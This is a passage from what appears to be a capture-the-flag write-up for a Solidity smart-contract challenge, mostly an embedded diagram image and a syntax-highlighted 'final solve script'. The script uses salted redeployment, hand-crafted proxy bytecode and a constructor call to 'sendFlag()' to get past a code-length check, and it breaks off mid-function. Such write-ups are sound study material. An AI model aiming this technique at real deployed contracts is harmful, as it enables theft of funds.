t3UjKUWm60r0dEuuuNd9g+32+feZF122VR4seP7gzYvUpt&#x2F;fq3z3vctVIXqTgf7ioNVLK8frQgQBlsaC+xf2iEndmlPUVeYhcBToZRIltvC00MoPEOtKHpGAx5jMAowKXQkI+PGnoDJkMiwp898Wv85EffRklJoWf&#x2F;8J67b59gWXIyjBIF4sOcMQKUwWZvzWkWbUpRpzyDzYyhjOgHORlGmHjIIvzlk8&#x2F;igR3bGQmJRWrx7d1X44kmnSqYRiRQ0TL0tRfpa&#x2F;reATxiHW4ZRpiy8OGEDQG6+YWOYZy52MwIkWewCRv0YeuIk2HYoPa&#x2F;I2&#x2F;Xp+gyFfcCJ9szJPIkwurrG&#x2F;C4Sc+dv4TUojI89k87&#x2F;Noz9HaNSkfN9wz9lyGvGZsINFMGm5rTzDok1ykPsIkdOXMyjFBZers&#x2F;xchRGq4YYOMrmlR0kdJRByLGsTELDh4+BafDDulZxcmmTc&#x2F;sfnv&#x2F;hD+LgTw8mjRClYUPK+wIHDxxkeU6vXlDJW5ez8&#x2F;Zhl0AIeiQk2EIQI2UJonYpHuGwRgXP2cYDBR5G7GAwKCRroiqRf+QiR3D4AE20S1VTobRLb8pR++LDL2jVKUNpCQneQJmJmuYZ6CJYYXhU5sRAmfrm5mVSGR4x+YqaDX8iqgZARnmh9gF0FPc7nP7xhXYGOO3+0R8Bppg60Q8rniCjSFvjyMwFQJ0iTYR4plLzdi2aQVWLeVXREW6xvzt3lc51Golxiw2thfscLji5t5XToaRrqV8fByBKEWAMtjsqalFok7D8pzyAJvIFiS5uen+V7fbDUGQARCgVChwY3U5ixqO9cLJMNYlzOfHEZhjBA6eoCuiTuOWDct4gM0cy2Kq7sk6&#x2F;MHTL8PpdHuqKZVy&#x2F;MvD90OjVkXwyIMzNE6GwcGRt8IR4AhMgcAgZbCpqcWA0cQz2ESwpojWIZ0lVSjkbJ8wHqxCEgknwwhWTD40jkCsIXD2El0RVYtFJfnYtmkltJrYtziiSYZS6zCerEJOhtGkpXysHIEYQcDpdDFCJGLkGWwiT6hkHR44cRGbVi+JG6uQk2Hk6SEfEUcgbhC4RldEHahFAmWw2bwS2Rn8HtBIEL7N7sQre45gxx0boFErI2FIYRmD7Ds&#x2F;e04IS0+8kzlDgG7p4IUjEKkIUAYbijq97cbluGnd0kgdZtSMSxCAYdMoRsxjMI1aYTJbYBqlf1tgtljZRQNWmwN2B325QZa60+UGXerspocFgf6DjAJKZTLI6Usug1Ihh1KpgFolh1qlhlajZHe56nVa6BN1SE5MQJJeh6RELZL1CUhJShxvI0oKI8MNm7VRMlw+zEAROFJjZbd08MIRiGQEBo0mdkUUBdps3biCZ7DxQ1jGkVH0DY6gb3AY3f2D7N&#x2F;GYSJBKzRqBTRaOTQaOZRqQKFwQaESoFLKoVTRzzIolYBcMf6lkAEyhQy+uIusJbeLiJK+j385nYDLJcDpABxON1wOOVxOGfvZZhNgs7phs7uQrNciLSURGWnJyMtKR1Z6CjLTk5CWrPdjhuGtwskwvHiHvTdOhmGHnHc4CwTEAJvykgJ2NpFnsBkHc2DIhPbuAbR09qCjZwB9AyYIEKDXK6DVyqDWuqDVyaDRAVqd3CepzUIsM3qUSNRqccNmASwWAU6bAhYLYDY7QbSblZGE&#x2F;JwMFOfnYF5uBjLSkmbUT7Ae4mQYLCQjtB1OhhEqGD6sSRGgDDZ0DIPuTiRCjMcMNl29Q2hq7cbV1k60dQ9AcAtITlFCm+BEgl6GRL0MKlUU+SC9pO1wCBg1C7CYgbExBUzDDsjkchhyM7CgMB8lhbnIy04L66eEk2FY4Q5&#x2F;Z5wMw4857zE4CDS19bC0bokJGmzbWIXszNgNsLHa7Ljc1ImLja1oau2BTCYgNU0Brd6JpBQ5tJroJT5&#x2F;tcFqE2AyumE1K2A0jmfBKSnMxpIFRVg0Pz&#x2F;kXgJOhv5KKkrrcTKMUsHxYXsQOHD8IvYdrMWtG5bhphi6Ioryf9ZdacPZS41obO1DTrYW+lQ3UlJlzOUZ78VqETBsFGA2ytHTa0VpURaWLy5FxQIDEnSaoMPDyTDokEZWg5wMI0sefDQzQ4D2zIgQ6aooOoaxoCh3Zg1FwFMXr7ThxIXLqL&#x2F;ajbxcHZLSnMjIVEAmj4DBRegQBDcw0O+CaUiJrm4LyhfkYfXSMixZaAjaiDkZBg3KyGyIk2FkyoWPamYI0E0YdDaxvLSApXWLlpyZI2YLjp25hFPnG6FWAymZbmRlyyGnME5eAkKAIlv7et0w9svhsAOrKkuxbsViJOt1AbXjXZmT4azgi&#x2F;yHORlGvoz4CANDwOGkK6Jqce5yC9tLXLm0JLAGwli7d2AYHx4&#x2F;hzN1rTAYdEjNckKv5yZgsERgNrth7FWird2CqopCbF6zbMbJGzgZBksqEdoOJ8MIFQwf1qwRuNbWy27D0CfoWNRpJGWwIbfu+0drcb6hAwaDGll5AjvXx0toEKBzj32dMrS121FZVoBb1lcFfFSDk2FoZBMxrXIyjBhR8IGECIGa43Us6jQSMti43G7sOXASh080YP58HXIK3NwVGiK5+2qWXKg9nXJca7LghtVluGNTNRRy&#x2F;yxxToZhFNRcdMXJcC5Q532GG4H+oRFGiEMjo9i2aQUWFOWFewiou9KKtz44gcQkIHeeG5o4OA4RdpD97JCy4HS3yzFqAu66aQ0q&#x2F;Ai04WToJ7jRWo2TYbRKjo97JgicuXiNpXVbTAE2m8MXYPPynoNoaO6CoVhAWoZiJkPnz4QAgaEBF9qaZSgrzsf9d9w4ZQ+cDEMggEhqkpNhJEmDjyUcCDgcTuw9eAbn61sYIa6sCF2ATU+&#x2F;EX&#x2F;ZXQOl2onCUn7nQTjkO5M+2hplcNhVeHD7JuRkpvpsgpPhTJCNomc4GUaRsPhQg4rAeAabWnajAh3DyEpPDmr7Ddc68eKbB2AoUrEAGV4iG4H+LhlaWxz4zN2bfSaC52QY2fKb9eg4Gc4aQt5AlCNAGWz21JxmEadb1gbniqhLje147rUalC1RsgPzvEQHAnRwv+GiEzvv24QlpRMP7HMyjA4ZzniUnAxnDB1&#x2F;MIYQoKMORIjDpjF2e&#x2F;tsMtiQxfnMS+9icYUaqen+RSrGEJRRPxXjoBuX6uz44gO3ocSQ45kPJ8OoF+3UE+BkGOMC5tMLCIHai9eY63TJgnmMFAPNYDNiGsNTz+1GXqGAzGxOhAGBH0GVB&#x2F;rc6GyR4ZHPbkdyUgIbGSfDCBJQKIbCyTAUqPI2oxkBu8PJCPFCQysjxEACbH7&#x2F;6rtwyczImeeKZgj42AF29EIpJOHvP3UbJ8N40AhOhvEgZT7HmSBA9wXSMYwkCrDZPH2ADVmV7x05ifJlPJ&#x2F;oTPCOxGfqzwm4dUM1qpbM55ZhJAoomGPiZBhMNHlbsYhAzUd12HfwDLZuXIHNaysmneJ&#x2F;PPs6svJtSEvnATMz1YMP3zqHjpZ+3PfQDUhIDP41TIGOa2jQhf5ODb7xhXs5GQYKXrTV52QYbRLj450LBMQMNuMBNitQWjjxiig6RrHr&#x2F;SMoXzYXowtdn2ePNaGtsQ9b76+GSh08kifSo7Llrr8BNjZqw&#x2F;7Xz7DfV66dj6IF2aGbWAAt158D7rllAyfDADCLyqqcDKNSbHzQc4QAuUL31tSioszAbsRQq8eza7+89xCGrV3IyY8tF2k4yZD6Guo3Iy1THxICnqnKdHcKSNXmcjKcKYDR8hwnw2iRFB9npCBAATZEiHQLPeU5raoowc+ffR15RXbok+Y2gpQI5eDeCwyq4oU5HouOrK7X&#x2F;nAYQ31m9rdP7FzHLC+H3YV9L5+EWqtCW2MvLGN2pGXpmZuyr2sYbz5&#x2F;zNNW9aYyHHqnDlqtCs1XejxtkJV34WQzq6dLUOOez61HZm4K+7m&#x2F;exi7&#x2F;nSUtSv+raN5wDPGpdXFzDoUx0EWYaJeg72vnMK2Has87cyl7M0miixVczKcSyGEo29OhuFAmfcRiwg0tnRj38FaJOsTcPlaJ6rXq+DnBQghgaPlai8O7bvg2W8TXZE33F7BCM9QmoXl60pA9d7762lGWinpeva3YeMoe06lUrKf9Sk6RlJSy3B40MyIjUiR2qFCbZ3&#x2F;6JqHdKXuT5GAb9y6lBGvdHzHP7jMnhfdpESaH+4+jzsfXM32CqkdshDFfkICmJ+NulzAqWP20JChdLUgHY+4IhE3Tgk8cWVC9TZuW+oTHALOPGyZlV9bqiDiqob6lArFW2B+Yump5q04gT4fivqcDEOBKm8znhD44FgdTpy&#x2F;hMXL53bWvvbhROtMammJVhiR45KVRROIUnzniUTlTYZTWWxiuyKRepOzFB3vsVI&#x2F;VCYj2blFFuhq1oaODKczgwmcC6eaPascb6BFcIigjr1fz35cd0v5jMxqavuDN8+yNnIKUicQLifDuVZD3j9HIPIR+NdfvohV&#x2F;7e9c+uJ67ri+P&#x2F;MfWAYbgMewAPEhEIwdmPSpK5Ty6mdqEqtpFaUSFWaj9DXvOctX6DvfamqPKRSFMmVFTVVbNlKVadYjQ117OAYBjzchgEGmBvnnGgP2mRzmDtz5lxYI4&#x2F;GNvvss&#x2F;Zvbfiz1l777PPGRYaiwGmjKa0o1VMMtWlQb5MHJwdDh6JKbfFNoQiSp3BFb&#x2F;N0rpEzQFFYZJgzRgxZeP2PT+7itatnDohbof&#x2F;nv1EwWGzxVaxOqhQgc+jknRmcfWUQt7+Y3g&#x2F;Vxfz7Ly+P4tH9+XzOvVBOnd1LdJw4SXju&#x2F;tlcfD+lwNqL6QgxCubteZt0KofF+bUD&#x2F;Vc6tnLtKDIsR4i+TgTKEzDDmqERkaH2nuK&#x2F;K40Mi2XMio2nvDfq24KtGcb0WjNkQlEqMiwGR&#x2F;vbD4&#x2F;oJl4dQlOLL1+We&#x2F;nai1XvTxFDdOaA50bD+2W9xSLDnWT6wBjEdAI7IkYUc95HWyiQF0NmI7OVlw+LPHgOn6UaeK6fpx3q6+K93kgM9aBKfR43Ap&#x2F;euINEagHhPuMKaLTiw38mXbl2Dl9+dq&#x2F;kmiFfT2R+E0WoXJpUXKLia4pDY735oES7Zij+nHvwzWx+irB2xdYHS4lpI+dXbEFBh79Xv8iQVxiJg+KVRaXW1rTixCK637z18&#x2F;weGK2QVQJMFFS2Vsju&#x2F;cPDxf0Is9I0qWizGAGK6QHehlVuielYbfkyb6edxJWMp9o2JIbVEqP2ROAwAbPsMxSzWWINRrlq0mJiyDNcvmYPLv3uLL66&#x2F;u2BKk9tBiwc6cBidG2&#x2F;fkNbH8KzZzwT1tvfie3tDN5873DlKLd5&#x2F;KVBQwtp2FNofn&#x2F;lVf3EsJbIkP&#x2F;WwquMRMfz6ckFlf+bR5OsFJi9tEU4hYp5xElUSgzFkmLWN09vTk&#x2F;OFtwnwyfA+csvYG0luS&#x2F;ihcbBbHjrj+dx6&#x2F;p9XTegkhjSj3YiUB8CLFUaoifQ1AemSXrR&#x2F;Qk05dKklawZsrQo2zfDy3YZu2LXleJaKC8tCmAxMWR7cMQy5moiQ&#x2F;Y0hztfTO2XDvPNptr1TnHvjV5PYyAxNMl3HZlheQL&#x2F;nZrBv&#x2F;49idEz9tp4b3nHHGEALCq8cmECE2NDxkSGzPZy1aSF8smlKqoK8dDmtHkbMW0pipa4tUIUQ743h13PhI7lzsXIlwsuW4vke3JYG76vRrv+yPPwPE2q56OJSAyP8J1ClxIBDYG&#x2F;&#x2F;P2fyGEDPRE62d7qkyMWleBGUN9TK4rtM9Q+vaDUPsNilUZaES3lkGILtNy+19+ZwPrqVv5pCSy9OnymLx+NshdPYbL0K7P7whunMTU5u1+JWqg6VLuWKEaEYnuepuUiS2Jo9W8rsv+4EODnGfYNAB1djY0Q&#x2F;&#x2F;zR53nMf&#x2F;robbC&#x2F;2+mz0fNnbRVYeKrSeYaNBm&#x2F;k&#x2F;SgyNJI+3duOBOike2t7df+k+&#x2F;fewKl+Oune2t6swnoSwypgUVMiUCGB6e+j+OtntzBy2oWOzvqd9lDh7alZjQQScRUPp7L44NpFjD3ff6AXOum+RqhWuYzE0CqeIjutRuDx0xj+9vlNRAZc6OqxmvXHz97lGDA&#x2F;u4v3376E4cHDDiMxtPmcIDG0uYNpeIYSWFpdxyfXb8LtlRE5pRhqC928OIHoEwdyGSf+cPUSToTaCjYkMbT5DCIxtLmDaXimIPDpjdv5ky0igyraKW1qCp8wIxJxGdGnEkYGe&#x2F;Hum78uaReJoWncpo8hJIb6cKVeiYCWwINHc7j+1V0EghJO9MnwehtbbUoe+YlAJqNiad4F9tzRq6&#x2F;9AuM&#x2F;GyiLh8SwLCJrNyAxtLb&#x2F;yHprEZAVBTdufYPbdx9h8Dkfwn0qHE4SxUZ5UZFVLC5IePpDGhdfGcFvL74EZ4WHUJIYNspLBt2HxNAg8HTbY00gnkjiy6&#x2F;v4f6jBUQiHnT1qHC5jjUSXQe&#x2F;uwusxCTMR7M4PdyH1y+cQ2d7S1X3JDGsCpf1GpMYWs9nZLF9CCzHN3DzP9&#x2F;i3tQcTp70ob1bRiBg3MkX9iG7N5LtLQWJZSei82mcG+&#x2F;HpZfPoruztaZhkhjWhM06F5EYWsdXZKl9CWxupfD1vWlMPngCj0dCW0hBqFuiFGoNLmep0PiKisSKhGwWmDgzhF+9+AKCAX8Nvf10CYnhkfCZ&#x2F;2ISQ&#x2F;P7iCw8XgSmH0dx98F3ePj9IsJhH4LtMjpDTkgUMBadCKoCxFdlJBMuxBZTGH0+jJfHRzA2HKnb5CExrBtKc3ZEYmhOv5BVRGAnlcHU4yj+9&#x2F;8ZzMytINztR6BdQbAV8Pmp6CadUrG5ASQTDiwtpzA00IWzo6cwPtyPJr+37hOIxLDuSM3VIYmhufxB1hCBQgTSmSy+e&#x2F;IM0zNzeDK3BElS0drmgL9FRkurA75jsE0jnVGR3FCQSjqxsa5AVaX8s0PHhvoxcqoXPq9H18lDYqgrXuM7JzE03gdkARGolkBsOYGZuRhm5p4hGluDqqoItrng98vwB4DmgAS327rRYy6nYntLRWoLSO04sbmxC0mSEOnpxFCkB0MDPejpbq8W25HakxgeCZ&#x2F;5LyYxNL+PyEIiUI4A26oxvxjH7LNlLCytYiWehAoVzQEn&#x2F;D4JHp+cT616&#x2F;SzF6oAZZJKd+JhOKcik2KeKbNqBVJpVgMqQIKGrswV9J0IY6O3GyXBn1VshyjGr9uskhtUSs1h7EkOLOYzMJQIVEljf3MbK2iaW4+tYjCewuraJ9Y1tbG6l4fU44fU54PU64PYADqcCp1uB2+WAyw04nVJ+36PDufdmzwWQnEyiDr+YqLEKTkVln3tvtq9PllXs5oDcrgIl54AsO5DLApmMgkxaQSYrIxjwoa21GaGOIMKhdnR3tKGrI4i2YHOFo2xcMxLDxrE25E4khoZgp5sSAcMIqCqwkWSiuIPkdhrJrRSS2ylsbe9gK5VGKpNFOpNDNptFNqdgd1fGrqxAUZjgqYCqsj+QmDJKEhzs7ZDgcjrgcjnhcTvg8Xjg87jh93kQaPLn3y3NfrQE2KcPwUATWlua9&#x2F;qwyIvE0CKOqtVMEsNaydF1ROD4EWBrk3k9hJpPZTIxY2t5x+FFYmhzL5MY2tzBNDwiQATqQoDEsC4YzdsJiaF5fUOWEQEiYB4CJIbm8YUulpAY6oKVOiUCRMBmBEgMbeZQ7XBIDG3uYBoeESACdSFAYlgXjObthMTQvFUrO+QAAABfSURBVL4hy4gAETAPARJD8&#x2F;hCF0tIDHXBSp0SASJgMwIkhjZzKKVJbe5QGh4RIAK6ECAx1AWreTqlyNA8viBLiAARMC+BvBia1zyyrB4EPv7wg3p0Q30QASJABGxL4Ecy2QfhYQTvUQAAAABJRU5ErkJggg==&quot; alt=&quot;flaw.drawio&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Final solve script and command&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: UNLICENSED 
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0.8.20&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;import {Script} from &amp;quot;forge-std&#x2F;Script.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;import {console} from &amp;quot;forge-std&#x2F;console.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;main &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address public&lt;&#x2F;span&gt;&lt;span&gt; proxy;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address public&lt;&#x2F;span&gt;&lt;span&gt; _contractA;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address public&lt;&#x2F;span&gt;&lt;span&gt; _challenge;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bytes32 public&lt;&#x2F;span&gt;&lt;span&gt; salt &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= keccak256&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;abi&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;encode&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint256&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;123&lt;&#x2F;span&gt;&lt;span&gt;)));
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    constructor () {
&lt;&#x2F;span&gt;&lt;span&gt;        _challenge &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0xD5Ed7B1be4F1bc62c3790a8E709Cd9D871062062&lt;&#x2F;span&gt;&lt;span&gt;);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;make_number&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;external &lt;&#x2F;span&gt;&lt;span&gt;returns (&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint&lt;&#x2F;span&gt;&lt;span&gt; n) {
&lt;&#x2F;span&gt;&lt;span&gt;        assembly {
&lt;&#x2F;span&gt;&lt;span&gt;            n := &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;number&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;deploy_CREATE&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bytes memory &lt;&#x2F;span&gt;&lt;span&gt;bytecode) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;private &lt;&#x2F;span&gt;&lt;span&gt;returns (&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt; a) {
&lt;&#x2F;span&gt;&lt;span&gt;        assembly{
&lt;&#x2F;span&gt;&lt;span&gt;            a := &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;create&lt;&#x2F;span&gt;&lt;span&gt;(
&lt;&#x2F;span&gt;&lt;span&gt;                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;add&lt;&#x2F;span&gt;&lt;span&gt;(bytecode, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;32&lt;&#x2F;span&gt;&lt;span&gt;),
&lt;&#x2F;span&gt;&lt;span&gt;                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;mload&lt;&#x2F;span&gt;&lt;span&gt;(bytecode)
&lt;&#x2F;span&gt;&lt;span&gt;            )
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;step_1&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        _contractA &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= address&lt;&#x2F;span&gt;&lt;span&gt;(new &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;contractA&lt;&#x2F;span&gt;&lt;span&gt;{salt: salt}());
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bytes memory&lt;&#x2F;span&gt;&lt;span&gt; bytecode2 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= abi&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;encodePacked&lt;&#x2F;span&gt;&lt;span&gt;(
&lt;&#x2F;span&gt;&lt;span&gt;            hex&amp;quot;5F5F5F5F5F73&amp;quot;,
&lt;&#x2F;span&gt;&lt;span&gt;            _contractA,
&lt;&#x2F;span&gt;&lt;span&gt;            hex&amp;quot;63FFFFFFFFF1&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;        );
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bytes memory&lt;&#x2F;span&gt;&lt;span&gt; bytecode1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= abi&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;encodePacked&lt;&#x2F;span&gt;&lt;span&gt;(
&lt;&#x2F;span&gt;&lt;span&gt;            hex&amp;quot;7F&amp;quot;,
&lt;&#x2F;span&gt;&lt;span&gt;            bytecode2,
&lt;&#x2F;span&gt;&lt;span&gt;            hex&amp;quot;5F556008602D5F3960085FF35f545f52435f5ff0&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;        );
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        proxy &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;deploy_CREATE&lt;&#x2F;span&gt;&lt;span&gt;(bytecode1);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;step_2&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Challenge&lt;&#x2F;span&gt;&lt;span&gt;(_challenge).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;vulnerable&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(proxy));
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;step_3&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;contractA&lt;&#x2F;span&gt;&lt;span&gt;(_contractA).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;s&lt;&#x2F;span&gt;&lt;span&gt;();
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;step_4&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        _contractA &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= address&lt;&#x2F;span&gt;&lt;span&gt;(new &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;contractA&lt;&#x2F;span&gt;&lt;span&gt;{salt: salt}());
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;contractA &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; use constructor to set code.length == 0
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address public&lt;&#x2F;span&gt;&lt;span&gt; _challenge;
&lt;&#x2F;span&gt;&lt;span&gt;    event &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;fallback_called&lt;&#x2F;span&gt;&lt;span&gt;();
&lt;&#x2F;span&gt;&lt;span&gt;    constructor() {
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; use low-level call to avoid revert in the first construction
&lt;&#x2F;span&gt;&lt;span&gt;        _challenge &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0xD5Ed7B1be4F1bc62c3790a8E709Cd9D871062062&lt;&#x2F;span&gt;&lt;span&gt;);
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(_challenge).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;call&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;abi&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;encodeWithSignature&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;sendFlag()&amp;quot;));
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;    function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;s&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;external &lt;&#x2F;span&gt;&lt;span&gt;{
